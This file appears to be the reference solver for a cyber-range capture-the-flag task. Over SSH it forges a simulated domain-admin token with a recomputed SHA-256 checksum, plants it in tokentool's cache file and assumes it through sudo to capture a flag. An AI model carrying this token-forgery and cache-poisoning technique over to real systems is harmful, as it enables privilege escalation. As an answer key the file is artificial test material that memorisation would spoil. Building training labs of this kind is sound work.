"""Intended-path solver: forge a token, plant it in the cache, assume it."""

import hashlib
import json
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

LIST_CMD = "sudo -n /usr/local/bin/tokentool --list"
SCHEMA_CMD = "cat /opt/tokens/svc-backup.json"
ASSUME_CMD = "sudo -n /usr/local/bin/tokentool --assume adm-sim"
CACHE_PATH = "/var/cache/tokentool/adm-sim.json"


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def _connect(host: str, port: int) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    return client


def _run(client: paramiko.SSHClient, cmd: str, timeout: int = 20) -> tuple[str, str]:
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode(errors="replace"), stderr.read().decode(errors="replace")


def _canonical(obj: dict) -> bytes:
    """Checksum recipe documented in /opt/tokens/README.txt."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":")).encode()


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = _connect(host, port)

    try:
        listing, list_err = _run(client, LIST_CMD)
        if "simulation" not in listing and "tokentool" not in (listing + list_err):
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="forge-and-assume",
                        ok=False,
                        detail=f"tokentool --list unusable: {listing[:120]} {list_err[:120]}",
                    )
                ]
            )

        sample, sample_err = _run(client, SCHEMA_CMD)
        try:
            issued = json.loads(sample)
        except ValueError:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="forge-and-assume",
                        ok=False,
                        detail=f"token store unreadable: {sample_err[:160]}",
                    )
                ]
            )
        # Learn the field names from the issued token instead of assuming them.
        body = {
            "domain": issued.get("domain", "LAB-SIM"),
            "groups": ["DOMAIN ADMINS-SIM"],
            "integrity_level": "high",
            "kind": "forged-sim",
            "user": "adm-sim",
            "version": 1,
        }
        checksum = "sha256:" + hashlib.sha256(_canonical(body)).hexdigest()
        forged = dict(sorted(body.items()))
        forged["checksum"] = checksum

        sftp = client.open_sftp()
        try:
            with sftp.open(CACHE_PATH, "w") as fh:
                fh.write(json.dumps(forged, indent=2) + "\n")
        finally:
            sftp.close()

        out, err = _run(client, ASSUME_CMD)
    finally:
        client.close()

    flags = find_flags(out)
    captured = flags[0] if flags else None
    detail = None
    if not captured:
        detail = f"no flag from tokentool output: {out[:200]} {err[:200]}"
    return SolveResult(
        results=[
            TaskResult(
                task_id="forge-and-assume", ok=bool(captured), captured=captured, detail=detail
            )
        ]
    )
